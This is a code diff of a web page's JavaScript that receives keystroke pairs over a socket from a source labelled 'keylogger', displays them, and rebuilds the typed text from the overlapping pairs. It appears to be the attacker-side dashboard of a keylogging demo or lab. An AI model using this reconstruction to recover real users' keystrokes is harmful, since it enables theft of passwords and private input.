@@ -43,7 +43,11 @@
 <div class="rebuild-result" id="rebuild-result"></div>
 <div class="_blank"></div>
 <script>
-    const logs = [];
+    const keys = [];
+    let startPattern = null;
+    let startPatternTime = Infinity;
+    let endPattern = null;
+    let endPatternTime = -Infinity;
 
     function createDom(keyValue, prefix = "_") {
         let div = document.createElement("div");
@@ -52,71 +56,63 @@
         document.getElementById("logged-keys").appendChild(div);
     }
 
-    function countDash(logs) {
-        let count = 0;
-        for (let log of logs) {
-            if (log.keys.indexOf("_") >= 0) {
-                count += 1;
-            }
-        }
-        return count;
-    }
-
-    function findStartIndex(logs) {
-        let pattern;
-        for (let i = 0; i < logs.length; i++) {
-            if (logs[i].keys.indexOf("_") === logs[i].keys.length - 1) {
-                pattern = logs[i];
-            }
-        }
-        for (let i = 0; i < logs.length; i++) {
-            if (pattern.keys[0] === logs[i].keys[0] && logs[i].keys.indexOf("_") < 0) {
-                return i;
-            }
-        }
-        return -1;
-    }
-
-    function getNext(cur, logs, visited) {
-        for (let log of logs) {
-            if (cur.keys[1] === log.keys[0] && !visited.has(log)) {
-                visited.add(log);
-                return log;
+    function getStartKey(pattern, cleanedKeys) {
+        for (let key of cleanedKeys) {
+            if (key[0] === pattern[0]) {
+                return key;
             }
         }
         return null;
     }
 
-    function rebuild(logs) {
-        let startIndex = findStartIndex(logs);
-        let visited = new Set();
-        let sequence = [];
-        let cur = logs[startIndex];
-        while (cur) {
-            sequence.push(cur);
-            cur = getNext(cur, logs, visited);
-        }
-        let result = "";
-        for (let i = 0; i < sequence.length; i++) {
-            result += sequence[i].keys[0];
-            if (i === sequence.length - 1) {
-                result += sequence[i].keys[1];
+    function getNext(cur, visited, cleanedKeys) {
+        for (let key of cleanedKeys) {
+            if (cur[1] === key[0] && !visited.has(key)) {
+                visited.add(key);
+                return key;
             }
         }
-        return result;
+        return null;
     }
 
-    function updateRebuildResult(newLog) {
-        let rebuildResultDom = document.getElementById("rebuild-result");
-        let numDash = countDash(logs);
-        if (numDash === 2) { // No typing to trigger more logs
-            rebuildResultDom.innerText = rebuild(logs);
-        } else if (numDash > 2) {
-            if (newLog.keys.indexOf("_") > -1) {
-                rebuildResultDom.innerText += newLog.keys[1];
+    function rebuildString(keys) {
+        const BUILD_FAILED = "build failed";
+        if (startPattern && endPattern) {
+            let cleanedKeys = keys.filter(item => item.indexOf("_") < 0);
+            if (cleanedKeys.length === 0) {
+                return startPattern[0];
             }
+            let startKey = getStartKey(startPattern, cleanedKeys);
+            let cur = startKey;
+            let res = [];
+            let visited = new Set();
+            visited.add(cur);
+            while (cur) {
+                res.push(cur);
+                cur = getNext(cur, visited, cleanedKeys);
+            }
+            if (endPattern[1] !== res[res.length - 1][1]) {
+                return BUILD_FAILED
+            }
+            let outStr = "";
+            for (let key of res) {
+                outStr += key[0];
+            }
+            outStr += res[res.length - 1][1];
+            return outStr;
         } else {
-            rebuildResultDom.innerText = "Unable to rebuild string";
+            return BUILD_FAILED;
+        }
+    }
+
+    function updatePatterns(data) {
+        if (data.payload[0] === "_" && +data.timestamp > endPatternTime) {
+            endPatternTime = +data.timestamp;
+            endPattern = data.payload;
+        }
+        if (data.payload[1] === "_" && +data.timestamp < startPatternTime) {
+            startPatternTime = +data.timestamp;
+            startPattern = data.payload;
         }
     }
 
@@ -125,8 +121,9 @@
         socket.on("UPDATE", (data) => {
             if (data.site && data.site === "keylogger") {
                 createDom(data.payload);
-                logs.push({keys: data.payload, time: data.timestamp});
-                updateRebuildResult({keys: data.payload, time: data.timestamp});
+                updatePatterns(data);
+                keys.push(data.payload);
+                document.getElementById("rebuild-result").innerText = rebuildString(keys);
             }
         })
     };
